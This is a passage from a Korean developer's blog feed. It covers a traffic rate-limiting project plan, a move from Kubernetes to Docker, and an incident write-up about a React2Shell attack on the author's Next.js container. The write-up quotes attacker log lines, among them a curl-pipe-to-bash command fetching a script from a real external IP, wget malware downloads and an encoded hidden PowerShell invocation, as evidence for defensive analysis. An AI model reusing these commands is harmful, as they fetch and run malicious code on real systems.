<p>특히 가장 핵심은 ‘URL’ 과 같은 유니크한 정보였다. AI 의 본질이 확률, 가능성을 기반으로 형성된 확률 계산기인 만큼, 사실 엄청난 양의 패러미터 사이즈를 가진다고 해도, 여기서 문제는 그것이 ‘정확한 정보’ 이냐 반대로 ‘그럴듯한 정보’냐 라는 지점이 문제시 된다. 그리고 실제로도 그 문제로 오히려 더 많은 시간을 소모했다. 헬름 차트 URL 을 못찾아 온다거나, 정책이 바뀌어 오픈하지 않는 경우 등이 이에 해당되었다.</p>

<p>결국 이러한 상태로 지지부진한 것은 프로젝트 전체를 위해 도움이 되지 않는 다고 판단했다. 못하는 건 다시 배우면 된다 치고, 러닝 커브는 돌파하기 어렵다면 지금은 우선 가능한 최선의 선택을 할 뿐이었다.</p>

<h3 id="토스-그리고-focus-on-impact">토스 그리고 Focus On Impact</h3>

<p>그리하여 어떻게 어떻게 다시 프로젝트를 이어 가던 도중, 갑작스럽게 링크드인을 통해 이런 공고를 볼 수 있었다.</p>

<p><img src="/assets/images/posts/2025-12/20251217-024.png" alt="" /></p>

<p>러너스 하이? 스스로의 성장을 증명하라? 해당 포인트는 너무나 완벽하게 나에게 부합하는 부분이었다. 거기다 작업하는 과정에서 고민이 되는 것이 있었다.</p>

<ul>
  <li>이전에 설명했듯, 구상과 구현이 어떻게 하면 되는지 다 아는데, 핵심인 k8s 를 내려놓고 개발만 하는게 맞을까?</li>
  <li>그리고 이러한 전체를 구현하는 것은 정말로 내가 개발자 스러운 전문성을 확보하는 걸까?</li>
  <li>나의 증명을 하겠다고 했지만, 과연 나 혼자만의 북치고 장구치고가 된다면 그건 증명이 맞을까?
이러한 질문들은 꼬리를 약간 물고 있었는데, 그러던 와중에 보인 이 광고. 그리고 정말 심플하게 적혀져 있는 토스의 문구는 나를 자극하기 충분했고, 노려볼만 하겠구나 라는 생각을 할 수 있었다.</li>
</ul>

<blockquote>
  <p>“결국, 시작이 반이라고 일단 할 수있는 최대한 빨리 지원하자!”</p>
</blockquote>

<p>이런 결정이 든 순간, 프로젝트를 약 3일 정도 멈추고, 최대한 빨리 이력서와 경력 기술서를 작성 했고, 놀랍게도…</p>

<p><img src="/assets/images/posts/2025-12/20251217-025.png" alt="" /></p>

<p>기회가 찾아왔다</p>

<h2 id="그래서-뭘-하지">그래서 뭘 하지?</h2>

<h3 id="focus">Focus</h3>

<p>기회를 받아냈다.
검증할 기회.
집중할 수 있는 기회.
도망칠 수 없는 기회.</p>

<p>기쁘지만 동시에 이젠 진짜 구나 라는 실감이 프로젝트를 홀로 할 때보다 확실하게 들었고, 특히나 오리엔테이션이 끝나고 나서, 한달이란 시간 내에 어떤 걸 해보면 좋을까? 에 대한 생각은 내 머릿속을 관통했다.</p>

<p>그리곤 오리엔테이션의 내용과 함께 1기에 먼저 참가했던 분들의 후기들, 그리고 그 속에서 나는 어떤 걸 해야 할까? 고민하게 되었다. 특히나 가이드를 통해, 서버의 헤드이자 연사로 나온 이항렬님의 이야기를 들으면서 다시 생각해보기 시작했다.</p>

<p>Project Protostar 를 물론 만드는 것도 중요하다. 증명한다면 좋겠지. 하지만 지금은 한달이란 기간의 극적인 효과를 낼 수 있어야 할 것이고, 특히나 스스로 성장할 포인트를 잡고 ‘완수’ 해내는 것이 너무나 중요하다. 하지만 실상 본질은 아니었다. 엄밀히 말하면 만들어 내든 안내든 그게 무슨 의미인가? 그것이 전문가가 되기 위한 명확한 근거가 되는가?</p>

<p>코드의 가치는 AI 를 통해 한없이 낮아졌다. 결국 그것이 날 대표할 순 없고, 나의 실무적 가치는 그것을 넘어서야 하는 거고, 그렇게 하기 위핸 더 깊은 어딘가, 실무에서든 어디에서든 분명하게 스스로 문제를 규정하고 풀어내고, 그 속에서 결과를 만들어내는 것이 기획자도 아니고, 프론트엔드 개발자도 아닌 내가 만들어낸 얄팍한 서비스를 들이밀며 ‘난 백엔드 개발자야’ 라고 이야기 할 순 없지 않겠는가?</p>

<h3 id="problem">Problem…?</h3>

<p>그러다 문뜩, 내 블로그에 적었던 나의 글이 떠올랐다. 기록하고 프로젝트를 다 하곤 보완하리라 생각하고, 현재는 응급 처치를 해둔 보안 결함성 문제.</p>

<ul>
  <li><a href="https://paul2021-r.github.io/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack.html">TIL - 내 컴퓨터가 채굴기가 될 뻔했…지만 해결기</a></li>
</ul>

<p>React2Shell 이라는 문제로 인해 NextJS 15 이상, React 19 이상인 프론트엔드 서버에서 내부에서 서버에 공격을 가하는 것이었으며, CPU 자원을 800% 나 끌어다 썼던 일. 방법이야 어찌 되었던 간에 L7 의 공격이 들어올 때 Rate Limiter 의 부재를 비롯, 여러 면에서 Traffic Dam 이 없었다는 점에서 공격을 허용한다는 것은 백엔드 개발자이자, 백엔드 인프라 차원에서 해결할 수 있어야 하지 않았을까?</p>

<p>그렇게 생각하니 퍼즐이 머릿속에서 맞춰지는듯 했다. 그렇다 내가 원하는 건 <strong>물론 이것 저것 다 재밌게 잘 하는 것</strong>도 재밌을 것이다. 하지만 더 중요한건, <strong>본질은 내가 서버 개발자이며, 서버 개발자로서 실무적으로도, 본질적으로도 해야할 일을 심화 하는 것</strong>. 그것이 얄팍한 올라운더보다 현재 가장 중요한게 아니겠는가?</p>

<p>그리하여 해야할 일을 몇 가지로 추려 보았다.</p>

<ol>
  <li>대기열 순서 보장</li>
  <li>유량 제어 안정성</li>
  <li>장애 복원력
그러나 여기서 React2Shell 같은 케이스가 발생 시 백엔드 서버에서 직접적인 해결책이 되기도 하며, 현재 상황에서 가장 현실적인 플랜으로 생각할 때 2번을 성공적으로 달성해 내는 것이 어떨까! 싶었기에 그것을 구현해 내려고 한다.</li>
</ol>

<h3 id="그렇다면-증명하고-구현할-것들의-로드맵은">그렇다면 증명하고 구현할 것들의 로드맵은?</h3>

<table>
  <thead>
    <tr>
      <th>주차</th>
      <th>목표</th>
      <th>핵심 작업</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>**1주차**</td>
      <td>MVP + Baseline 측정</td>
      <td>챗봇 API 연결, **"Dam 없는 상태"에서 부하 테스트 → Before 수치 확보**</td>
    </tr>
    <tr>
      <td>**2주차**</td>
      <td>Traffic Dam 핵심 구현</td>
      <td>Rate Limiter (Token Bucket) + BullMQ 대기열 + Backpressure 로직</td>
    </tr>
    <tr>
      <td>**3주차**</td>
      <td>스트레스 테스트</td>
      <td>k6로 5,000 RPS 공격 시뮬레이션, **Dam 있는 상태 → After 수치 확보**</td>
    </tr>
    <tr>
      <td>**4주차**</td>
      <td>비교 분석 + 문서화</td>
      <td>Before/After 그래프, Grafana 대시보드 캡처, 성장 일지 마무리</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p><strong>“초당 5,000개의 악의적 요청이 들어와도, 백엔드는 초당 100개만 처리하며 죽지 않는다”</strong></p>
</blockquote>

<p>챗봇, 특히 LLM 은 이용하기에 좋은 먹잇감이며, 특히나 그 구조 상 AI 를 혹사 시킬 수도 있다. 그러다보니 프론트엔드에서 제한을 걸긴 하지만, 그럼에도 API 사용 시 제한으론 부족함도 있었다. 그렇다면, 내 API 비용(?) 을 포함 여러가지를 지켜낼 수 있는 것들을 위의 일정을 거쳐 구현해내고 검증하면 어떤가? 하고 생각했다.</p>

<p>Docker를 기반으로 Grafana, Prometheus, exPorter, cAdvisor, loki-promtail이 설정 되어있다. 배포도 준비 되어 있고, 챗봇도 일단 겉 모습은 되어 있으니 그걸 그대로 쓴다면? 현재의 문제를 묘사해보고, 실제 그런 일이 발생시 버틸 능력을 기른다. 이것은 어쩌면 광활하고 얕은 프로젝트를 마무리 짓기 보다 우선시 하는게 낫지 않겠는가!</p>

<h4 id="기술적-base-why">기술적 Base why</h4>

<p>해당 Traffic Dam  아키텍쳐를 구현하는 것은 기존에도 Protostar 프로젝트의 Polyglot 구조를 그대로 차용할 것이다. 이는 AI의 작업에 맞는 프레임워크와 웹 서버 본질에 충실한 NestJS 를 혼용함으로써 각각의 장점을 극대화 하려는 측면이 있기 때문이다. 특히나 두 서비스의 Redis 기반의 느슨한 결합을 통해 하드웨어적으로 모니터링과 서비스를 단일지점장애가 발생하지 않도록 설계하였듯, 각각의 컨테이너도 서로의 장애가 전파되지 않도록 할 것이다.</p>

<h4 id="측정-계획은">측정 계획은?</h4>

<p>로드맵에 나온 측정은 아직 완벽하게 어떤 툴을 쓸지를 정한 것은 아니다. 그럼에도 구체적으로 고민과 진득한 AI와의 씨름 끝에 합당할 만한 수치들을 정리해보면 다음과 같았다.</p>

<ol>
  <li>시스템 안정성 : ‘시스템이 공격을 버티는 가’
    <ul>
      <li>에러율(Error Rate)</li>
      <li>성공적 요청 처리량(Worker TPS)</li>
      <li>서버 재시작 횟수(OOM)</li>
    </ul>
  </li>
  <li>리소스 효율성 : ‘얼마나 효율적으로 버텨내는가?’
    <ul>
      <li>CPU 사용률(CPU Usage %)</li>
      <li>메모리 사용률(Memory Usage)</li>
      <li>FD 사용량: 해당 수치는 다만 간단한 구현 과정에서 의미가 없을 수도 있다고 생각함</li>
    </ul>
  </li>
  <li>사용자 경험 및 큐 성능
    <ul>
      <li>API 응답 시간(Latency)</li>
      <li>대기열 길이(Queue Length)</li>
      <li>평균 대기시간(Avg. Wait Time)</li>
    </ul>
  </li>
</ol>

<h4 id="리스크--가정">리스크 &amp; 가정</h4>

<p>단 생각해보니 현재는 AWS 구축을 고려한 설계와 호환성을 갖춰둔 구조를 취하고 있지만, 그럼에도 온프레미스 라는 점을 감안할 때 몇가지 가정이 필요하다는 생각은 들었다.</p>

<ol>
  <li>온프레미스 환경에서 모니터링과 서비스 서버 각 1대가 별도의 네트워크로 HTTPS, HTTP 를 모두 할당 받은 상태이므로 기본적으로 연결에서 안정성은 문제가 없다.</li>
  <li>현재의 온프레미스 서버는 기본적으로 라이젠 칩셋이 탑재된 40GB 의 메모리를 가진 서버로, 일반적인 서버 리소스보다 매우 넉넉한 환경을 갖고 있으며 이를 고려한 고 가용성 테스트로 수치를 점점 늘려 나갈 것이다. (반대로 서버의 성능을 제한을 걸어 테스트를 해야할 필요도 있어 보인다. 더 제약이 걸린 리소스 상태로 최대 처리를 재는게 더 현실적일 순 있으니)</li>
  <li>아주 최악의 상황일 수 있는 것으로 공유기가 한계치에 부딪힐 수 있다는 점인데, 현재의 상황은 다음과 같다.
    <ul>
      <li>WIFI 7을 지원하는 최신 성능의 칩셋 탑재 공유기 사용중</li>
      <li>해당 공유기의 리소스를 최소화하고자 해당 공유기는 모두 유선 연결이 기본이며, 집의 wifi 는 메인 공유기에서 쓰지 않고 서브 공유기를 통해 수행되어, 리소스 사용을 오로지 서비스 자체에 집중한다. (AP 모드)</li>
      <li>만약 공유기가 먼저 문제가 발생한다면, 이 역시 Docker 자체의 하드웨어를 제약을 걸어 놓고, 이를 기반으로 적용된 Traffic Dam 로직을 기반으로 얼마나 성능과 지표가 나오는지를 본다.</li>
    </ul>
  </li>
  <li>위의 점을 기반으로 볼 때, 핵심은 주어진 단일 노드의 물리적 한계 내에서 소프트웨어 아키텍처 만으로 어디까지 트래픽을 제어할 수 있는지 증명하는 것이기에, 네트워크 지연, 분산 시스템의 복잡성은 제외한다.</li>
</ol>

<h2 id="결론">결론</h2>

<p>너무나 감사하게도 1차적으로 선발될 수 있었기에, 그 기회를 제공 받았단 말 만으로도, 나의 노력들이 헛으로 쓰이진 않았구나 라는 생각을 할 수 있었다. 1년간 치열하고 치밀하게 달려온 것들, 정리한 것들이 결국 다 나의 경험이자 가치이며, 내가 개발자로 살아갈 수 있구나를 토스가 다시 한 번 검증해준 것 같아 기분이 좋았다.</p>

<p>결국 실력의 검증, 그 실력의 증명을 내 나름의 방식으로 해결했단 것이고, 이걸 기반으로 확장해 나가면 되지 않겠는가? 그리고 그런 와중에 새롭게 해야할 일을 빠르게 찾아갈 수 있었고, 그 목표 역시 지금 내가 판단할 방법은 없지만, 분명 토스가 원하는 것에 합당하리라 생각이 들었다.</p>

<blockquote>
  <p>정형화된 방식을 그대로 따르기 보다,
각자의 환경에 맞는 최적의 해답을
스스로 탐색해나가는 시간</p>
</blockquote>

<p>러너스 하이 2기의 내부 내용은 공개할 수도 없고, 애초에 평가 방식이라던가 이런 미공개인 관계로 나도 모르지만, 어쨌든 이 문제를 개선해보고 직접 로깅하고 데이터를 비교하면서 제대로 백엔드를 구현해낸다면? 어쩌면 다음 단계의 내 모습이 나를 기다리고 있으니 해야 할 일은 정해져 있었다. 제한된 리소스를 최대한 활용하고, 활용한 결과를 냉정하게 분석하고 개선한다.</p>

<p>턱 밑까지 숨이 차오를 수 있도록, 그리하여 달리다가 서서히 아픔이 사라지고, 끈덕지게 문제를 해어 나가는 과정에서 새로운 지평선이 보일 수 있도록.</p>

<p>노력해야겠다.</p>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><summary type="html"><![CDATA[들어가면서]]></summary></entry><entry><title type="html">TIL - 내 컴퓨터가 채굴기가 될 뻔했….지만 해결기</title><link href="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack.html" rel="alternate" type="text/html" title="TIL - 내 컴퓨터가 채굴기가 될 뻔했….지만 해결기" /><published>2025-12-09T00:00:00+00:00</published><updated>2025-12-09T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack.html"><![CDATA[<h2 id="내-컴퓨터가-채굴기가-될-뻔했지만-해결기">내 컴퓨터가 채굴기가 될 뻔했….지만 해결기</h2>

<p><img src="/assets/images/posts/2025-12/20251209-020.png" alt="" /></p>

<p>개인 프로젝트를 진행하다가 갑자기 프론트엔드 서버가 동작하지 않는 것을 발견하였다. 백엔드 서버도 문제없이 돌아가고 있었고, 이미 기존에 충분히 안정성을 검증했던 거라, 갑자기 안된다는 것에 이상함을 감지하고 Grafana와 Docker logs 를 뒤져보기 시작했다. 그런데…</p>

<p><img src="/assets/images/posts/2025-12/20251209-013.png" alt="" /></p>
<blockquote>
  <p>응….? 800%?</p>
</blockquote>

<p><img src="/assets/images/posts/2025-12/20251209-014.png" alt="" /></p>
<blockquote>
  <p>엥?</p>
</blockquote>

<p><img src="/assets/images/posts/2025-12/20251209-015.png" alt="" /></p>
<blockquote>
  <p>에에엥?</p>
</blockquote>

<p><img src="/assets/images/posts/2025-12/20251209-016.png" alt="" /></p>
<blockquote>
  <p>컨테이너를 다시 켜면서 로그는 여기까지…</p>
</blockquote>

<p>뭔가 쎄한 감정이 드는 순간, 여기저기서 오는 메일, 알림. 털렸다는 소식이 들려오기에 우선 제일 먼저 로그부터 까보기로 했다. 그러자 몇 가지 단적인 문제 포인트들을 찾을 수 있었다.</p>

<h3 id="로그-분석-결과-해킹-시도-증거">로그 분석 결과: 해킹 시도 증거</h3>

<p>로그 곳곳에 공격자가 서버를 장악하고 악성 스크립트를 실행하려 한 흔적이 있었다.</p>

<ul>
  <li><strong>외부 IP 연결 시도:</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Connecting to 193.34.213.150</code></li>
      <li><code class="language-plaintext highlighter-rouge">curl http://45.134.174.235:443/2.sh | bash</code></li>
      <li>이 IP들은 공격자가 악성 파일을 호스팅하는 C&amp;C(Command &amp; Control) 서버인지는 알 수 없지만, 확실한건 수십차례, 수시간 동안 계속 연결을 시도했다.</li>
    </ul>
  </li>
  <li><strong>악성 파일 다운로드 및 실행 시도:</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">wget: can't open 'x86': File exists</code>:  <code class="language-plaintext highlighter-rouge">x86</code>이라는 파일을 다운로드하려 했다.</li>
      <li><code class="language-plaintext highlighter-rouge">/dev/health.sh</code>: 일반적인 Next.js 컨테이너에는 존재하지 않는 경로의 쉘 스크립트, 아마도 health 로 볼 때, 다른 보안 프로그램 등에서 문제 없다고 넘어갈 수있게 만드려는 도구가 아닐가 추정된다.</li>
    </ul>
  </li>
  <li><strong>공격 페이로드 (Payload):</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">powershell -nop -w hidden -enc ...</code>: Base64로 인코딩된 파워쉘 명령어를 실행하려 했다.</li>
      <li><code class="language-plaintext highlighter-rouge">wow i guess im finna bridge now... MEOWWW...</code>: 스크립트 키디(Script Kiddie)나 특정 봇넷이 남기는 시그니처 메시지입니다.</li>
    </ul>
  </li>
</ul>

<p>CPU 사용량 800% 를 찍었고, 서버가 뻗을 뻔 했지만 살아는 있었다. 그렇기에 얼른 컨테이너 이미지와 볼륨을 새로 정리한 뒤, 우선 해결책으로 방법을 찾아 다녔다.</p>

<h3 id="해결-다행이-빠르게-해결-된다-하지만-주의사항">해결: 다행이 빠르게 해결 된다. 하지만 주의사항</h3>

<p><img src="/assets/images/posts/2025-12/20251209-017.png" alt="" /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npx fix-react2shell-next
</code></pre></div></div>

<p>다행이 사용하는 기술 스택이 next 였기도 하고, next 역시 빠르게 대응 빌드를 올리게 되면서, 해당 명령어만 치면 문제는 해결 된다고 했다.
하지만 이렇게 될 경우 문제가 있는데 그것은 바로 호환성 관련된 영역이다.</p>

<p><img src="/assets/images/posts/2025-12/20251209-018.png" alt="" /></p>

<p>빌드 및 자동배포가 터졌고 로그를 확인해 보았다. 왜 그런가 알아보니, next 기반인  react 와 eslint 는 next에 대응되는 버전이 필요하였고, 버전이 안 맞으면 빌드 시 터지는 것이었다. 하물며 어이없게도 next 공식 보안 패치 명령어는 이러한 문제를 해결해주지 않는 것을 (…) 알게 되었다.</p>

<p>프론트엔드 개발자는 아니기 때문에 내가 몰라서 그랬던 건지는 모르겠지만, 이렇게 package.json 의 버전을 바꿔주면 비로소 해결 되는 것을 알 수 있었다.</p>

<h3 id="흠-근데-희한하네-왜-괜찮았지">흠 근데 희한하네… 왜 괜찮았지?</h3>

<p>그리하여 정리하고 배포를 다시 안전하게 하고, 하는 김에 Jenkins 잡까지 다듬어서, 정리를 했는데 왜 이런 일이 터졌고, CPU 사용량 800% 로 뚫은 것도 사실인데, 반대로 로그를 뒤져본 결과 공격이 실패했고, 동시에 왜 다른 서버는 쌩쌩하게 살아있던거지? 라는 생각이 들어 로그와 내용을 좀 분석 해볼 필요가 있다고 느꼈다.</p>

<h4 id="무엇이-문제를-키웠나">무엇이 문제를 키웠나?</h4>

<ul>
  <li><strong>취약점은 답이 없다</strong> : 근본적으론 보안 구멍이 발생한 것 자체가 문제기는 했다. 종단간 암호화에 프록시 까지 잘 앞에 세워뒀었고, 그정도면 어지간하면 문제가 없어야 하는데 당장에 구멍이 뚫려있으니… nextjs 자체가 쉘로 동작하고 명령어를 실행시키는 것은 정말 충격적이었다.</li>
  <li><strong>Rate Limiter &amp; WAF 의 부재</strong> :
    <ul>
      <li>내 핵심 문제 사항이라고 볼 수 있는데… 개발과정에 있다보니 해당 보안 처리를 아직 설정을 안한 상태였다.</li>
      <li>로그를 디테일하게 파보니 Next.js 의 취약점을 이용해 L7 레이어 공격이라 네트워크 방화벽 L3/L4 를 우회했고, 이 와중에  <code class="language-plaintext highlighter-rouge">child_process.exec()</code> 이나 <code class="language-plaintext highlighter-rouge">spawn()</code> 을 호출한 것으로 보였다.</li>
      <li>그리고 <code class="language-plaintext highlighter-rouge">wget: can't open 'x86x: File exists</code> 라는 메시지도 있었는데 이는 ‘이미 파일이 있다’는 에러이고 이런 점에서 감안하면 다음과 같은 상황으로 추론이 되었다.
        <ol>
          <li>첫번째 다운로드 성공한게 아닌가 싶다.</li>
          <li>하지만 성공한 프로그램이 제대로 구동 안됨</li>
          <li>계속 다운로드 시도 및 프로세스 생성 -&gt; 프로세스가 계속 발생하면서 처리가 필요했고 그 과정에서 800% 이용률 발생</li>
          <li>하지만 시도한 방법 자체가 대단히 심플한 명령어 수행 요청이었고, 좀비 스레드가 생성될 순 있겠지만 그것이 시스템의 제어를 망가뜨릴 정도까지는 가지 못했다- 는 점을 알 수 있었다.</li>
        </ol>
      </li>
      <li>따라서, 결과적으로 Rate Limiter 와 WAF 를 통해 지능적으로 문제 시 될 요청을 제한했다면 아주 완벽한 보안이 되지 않을까 한다.</li>
    </ul>
  </li>
</ul>

<h4 id="그런데도-불구하고-털리지-않은-점은">그런데도 불구하고 털리지 않은 점은?</h4>

<ul>
  <li>그럼에도 신기하게 서버 통으로 문제가 발생하진 않았었다. 이유는 무엇인가?</li>
</ul>

<ol>
  <li><strong>플랫폼 차이</strong> : 로그를 보니 <code class="language-plaintext highlighter-rouge">powershell -nop -w hidden -enc ...</code> 이런 로그가 눈에 들어왔는데, 즉, 공격자는 윈도우 서버를 공격할 목적이 다분해 보였다. 아마도 시스템 권한이나, 자원 사용에 있어서 윈도우즈 보안이 뚤릴 것을 노린게 아닌가 싶은데… 애석하게도 리눅스 시스템으로 가능한 보안적으로 든든한 Ubuntu LTS 버전, 보안패치를 짱짱하게 받은 상황이니 다행이라고 볼 수 있겠다.</li>
  <li><strong>경량형 이미지와 온전한 컨테이닝</strong> : 로그 중에 <code class="language-plaintext highlighter-rouge">/bin/sh: curl: not found</code>, <code class="language-plaintext highlighter-rouge">/bin/sh: bash: not found</code> 이런게 보였다. 여기서 나름 뿌듯함을 느꼈다. 개발 하는 시점부터 써야 하는 이미지는 리소스를 최대한 줄이며, 완벽하게 하나의 역할에 맞춰 설계를 하는게 낫다- 고 생각했는데 이번 사건이 그 아주 좋은 경험이었다. 다른 작업을 하는데 필요한 도구들에 접근 자체가 불가능했고, 권한이 없는 상태에서 할 수 있는 최선의 시작점이 실행이 안되니 입구 앞에서 아무것도 할 수 없었던 것이다. 이러한 전략을 <code class="language-plaintext highlighter-rouge">공격 표면 축소(Attack Surface)</code> 라는 방법론이라고 한다는데</li>
</ol>

<p>이렇듯, 의도치 않게 1 스트라이크, 1 아웃을 경험하였고, 다행이 도구들이 준비되고, 무중단 배포나 모니터링이 얼추 되어 있다보니 다행이 문제를 해결할 수 있었다. 그리고 동시에 전에 사수가 이야기 했던 공격에 대한걸 떠올리면서, 역시 라이브 서비스는 기본 타협없이 반드시 지켜야 할 것들을 지켜 놓는게, 신상에 이롭다는 사실을 이해할 수 있었다.</p>

<p>동시에 당초 목표로 AWS 호환 되도록 인프라를 설계 했었고, 만약 클라우드(AWS, Azure 등)의 오토스케일링 환경이나 종량제 과금 모델을 쓰고 있었다면, 이번 CPU 800% 폭주로 인해 이번 달 서버 비용으로 컴퓨터 한대 해먹지 않았을까? (…) 여러 모로 교훈이 되는 경험을 하지 않았나 싶다. 그리고 동시에 얼마나 털기 쉬우면 윈도우로 채굴 같은걸 하려고 했는지는 모르겠지만… 서버로 윈도우를 쓰는 건 자제하자는 나름의 교훈(?) 도 하나 얻어 가는 것 같다.</p>

<p>요 최근 쿠팡도 그렇고, 통신사들도 그렇고, 보안 신경… 정말 스스로 조심하는 것도 중요하고, 무엇보다 회사에서 사고치지 않도록 이부분은 타협하지 말아야 한다는 점.. 명심해야겠다. (라는 생각에 따라 오늘 작업은 우선 nginx 앞에 SafeLine 이라는 WAF 를 하나 세워 둬야겠다…)</p>

<p><img src="/assets/images/posts/2025-12/20251209-019.png" alt="" />
<a href="https://github.com/chaitin/SafeLine">SafeLine Github Repository</a></p>]]></content><author><name>Paul2021-R</name></author><category term="학습" /><category term="Frontend" /><category term="NextJS" /><category term="React" /><category term="Security" /><summary type="html"><![CDATA[내 컴퓨터가 채굴기가 될 뻔했….지만 해결기]]></summary></entry><entry><title type="html">TIL - 11월, K8s 실패 + Docker 환경으로의 전환 정리</title><link href="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/05/00-til-change-plan.html" rel="alternate" type="text/html" title="TIL - 11월, K8s 실패 + Docker 환경으로의 전환 정리" /><published>2025-12-05T00:00:00+00:00</published><updated>2025-12-05T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/05/00-til-change-plan</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/05/00-til-change-plan.html"><![CDATA[<h2 id="k8s-실패--docker-환경으로의-전환-정리">K8s 실패 + Docker 환경으로의 전환 정리</h2>

<p>제목처럼, K8s 로의 완전한 통합환경 구축의 실패와 이후 Docker 기반의 컨테이닝으로 실서비스 배포에 대한 전체 내용을 정리한 글이다.</p>

<h3 id="증명을-할-필요가-있다">증명을 할 필요가 있다</h3>

<p>Protostar 프로젝트를 진행하게 된 것은 어디까지나 1년 차인 내가, 참 많은 일들을 겪었고 증명이 이제는 필요하다는 생각을 했다.</p>

<p>개발자로 살아남기 위해선 정말 어려운 일들을 해낼 수 있을 지식의 풀과 넓이가 있어야 하고, 결국 그걸 증명해내야 한다.</p>

<p>반대로 말하면 물경력이 되는 이유는 당연하지만 ‘회사’는 메이는 곳이고, 회사에서 경험을 쌓는 공간으로 개인 입장에서 맞지만, 한 편으로 그것은 회사의 입장과는 상관 없는 입장이며, 회사의 규모와 수준에 맞춰서 기회가 생기는 것이니, 절대 다수가 1류 기업에 들어갈 수 없다는 점을 생각한다면 대다수가 물경력이 되는 이유는 바로 이 지점에서 생긴다고 생각한다.</p>

<p>그러니 나아가서 증명.
기업이 바라는 인재가 되려면 무언갈 해야하지만,
회사에서 그걸 하긴 쉽지 않다. 그리고 동시에 내 개인의 사정 등등… 결국 고려하고 달려온 결과, 증명의 필요가 있었다.</p>

<h3 id="왜-kubernetesk8s-인가">왜 Kubernetes(k8s) 인가?</h3>

<p>백엔드 개발자로 사실 백엔드 기술 측면에서 본다면 당연히 프레임워크, 그리고 각종 보안에 대한 이해도가 필요하다. 특히 리소스, 대용량 서비스, 특히나 메시지 기술을 활용한 분산처리는 백엔드의 꽃이자 A to Z 라고 배웠다.</p>

<p>그러나 오케스트레이션 도구인 K8s 의 등장은, Container 기술을 기반으로 성장하고 Docker 로 꽃 피운 새로운 시대에, 더욱이 위의 핵심, 맹점을 제대로 다루기를 가능케 했다.</p>

<ol>
  <li>Self healing : Desired State 를 기술함으로서, 자동 재시작이 가능해지고, 노드 관리를 통해 컨테이너들을 자동으로 유지 시켜준다.</li>
  <li>Auto Scaling : 1번과 함께, 트래픽에 대한 하드웨어 모니터링, 리소스 기준을 제시해줌으로써 대용량 설계를 손쉽게 가능하게 한다.</li>
  <li>Rolling Update &amp; Rollback : 여러 CICD 파이프라이닝 도구들을 기반으로 무중단 배포(Zero-down time) 의 구현이 손쉽고, 이는 이용자가 모르는 사이에 업데이트 및 서비스 가용성을 극대화 시킨다. 또한 잘못된 업데이트가 이루어질 때 이에 대한 롤백은 명령어 하나로 즉시 가능하다.</li>
  <li>Bin packing : 각 컨테이너의 필요한 자원의 수준을 결정하고, 이에 따라 노드들을 구성, 서비스를 위한 하드웨어에 그 자원을 딱 맞춰 사용할 수 있도록 구축이 가능하므로, 이를 통한 인프라 비용의 최적화를 이루어낼 수 있다.</li>
  <li>Cloud Agnostinc : AWS, GCP, Azure 등 혹은 자체 데이터 센터까지, 사실 최초의 서비스 플랫폼들은 각각 자체적인 기준과 락인 형태를 구축하기 바빴다. 물론 그렇게 구축되는 것이 매우 편리한 것은 사실이며, 또한 안정성 역시 담보 받을 수 있었다. 하지만 문제는 락인 되었을 때 비용, 동시에 환경들이 별도이다 보니 발생하는 버그 발생 가능성, 그리고 서비스 플랫폼을 여러 곳에서 쓴다고 한다면 설령 Containerize 된 환경이라도 발생 가능한 여러 이슈들의 종합적인 대응. 이를 위하여 완전 표준 기술처럼 동작하고, 이를 기반으로 설정되기에 일부 특화 서비스를 제외하곤 클라우드 제공 업체, 환경을 뛰어넘는 배포를 가능케한다.</li>
</ol>

<h3 id="하지만-이번에는-실패했다--아쉽지만-다른-방법으로">하지만 이번에는 실패했다 &amp; 아쉽지만 다른 방법으로</h3>

<p>그리하여 호기롭게 도전하였다. Dockerize는 너무나 쉬운 일이었고, 이제는 Docker 기반으로 나름대로 뭐든 올릴 수 있겠다는 확신이 있었다. 또한 거기서 내가 뭘 더 할 수 있어야 나에게 도움이 되는가? 라고 한다면 당연히 데이터의 관리 파이프라인 전반에 대한 이해도를 높이는 것이리라 생각했다. 그렇기에 k8s 를 선택. 파고 들어보았다.</p>

<h4 id="순조롭던-microk8s-부터-argocd-까지">순조롭던 MicroK8s 부터 ArgoCD 까지</h4>

<p>서버의 배포는 원래 아주 가벼운 OS 기반으로 할까 생각을 했다. Arch 나 Alpine. 하지만 종합적으로 여러가지를 고려한다면 어차피 세팅이 필요한 호스트 OS 이다보니, 이러한 설정이 다 있는 편리한 OS, Ubuntu 기반으로 생각했다.</p>

<p>그러니 당연히 snap 을 기본으로 쓸 수 있었고, Snap의 장점인 완전히 격리된 환경에서 구동 가능한 앱 환경에서 쓰기 편리한 것, 그것이 바로 MicroK8s 라는 도구였다.</p>

<p>MicroK8s 를 설정한 이유는 위에서 언급한 부분도 있지만, 가볍다고 소개가 되어 있었고, 쉬운 확장성 기능들을 지원해 <code class="language-plaintext highlighter-rouge">microk8s enable dns</code> 이런식으로 명령어 한줄이면 서비스 구축을 위한 애드온들을 기본 내장하고 있었다. 특히나 <code class="language-plaintext highlighter-rouge">CNCF</code> 인증을 받아, 기존에 많이 쓰던 AWS, GCP 등 어떤 곳이든 클라우드 환경과 동일하게 작동을 보장했다.</p>

